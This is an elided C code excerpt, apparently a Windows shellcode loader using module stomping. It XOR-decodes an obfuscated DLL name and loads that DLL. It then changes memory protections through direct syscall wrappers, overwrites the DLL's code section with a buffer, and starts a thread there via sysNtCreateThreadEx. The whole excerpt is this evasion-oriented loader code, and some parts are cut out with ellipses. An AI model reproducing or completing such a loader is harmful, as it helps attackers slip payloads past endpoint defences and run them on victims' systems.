...
int main(){
    ...
    char swmp_dll[] = { 0x34, 0x02, 0x1e, 0x58, 0x01, 0x1e, 0x18, 0x0 };
    XORNull((char*)swmp_dll, sizeof(swmp_dll), (char*)xorKey, keyLen);
    PBYTE dll = (PBYTE)pLoadLibraryA(swmp_dll);
    XORNull((char*)swmp_dll, sizeof(swmp_dll), (char*)xorKey, keyLen);
    if (!dll) {
        return -1;
    }
    ...
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dll + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER firstSection = IMAGE_FIRST_SECTION(ntHeaders);

    DWORD size = firstSection->SizeOfRawData;
    PBYTE text = dll + firstSection->VirtualAddress;
    ...
    PBYTE baseAddr = text;           
    SIZE_T regionSize = Mem.Length;   
    NTSTATUS NtProtectStatus1 = sysNtProtectVirtualMemory(
        NtCurrentProcess(),
        (PVOID*)&baseAddr,
        &regionSize,
        PAGE_READWRITE,
    ...
    MOVE_MEMORY(text, Mem.Buffer, Mem.Length);

    NTSTATUS NtProtectStatus2 = sysNtProtectVirtualMemory(
        NtCurrentProcess(),
        (PVOID*)&baseAddr,
        &regionSize,
        PAGE_EXECUTE_READ,
    ...
    LPTHREAD_START_ROUTINE threadRoutine = (LPTHREAD_START_ROUTINE)text;
    ...
    GetSyscall(syscallNum);
    GetSyscallAddr(syscallAddr);
    NTSTATUS NtCreateThreadstatus = sysNtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), threadRoutine, NULL, FALSE, NULL, NULL, NULL, NULL);
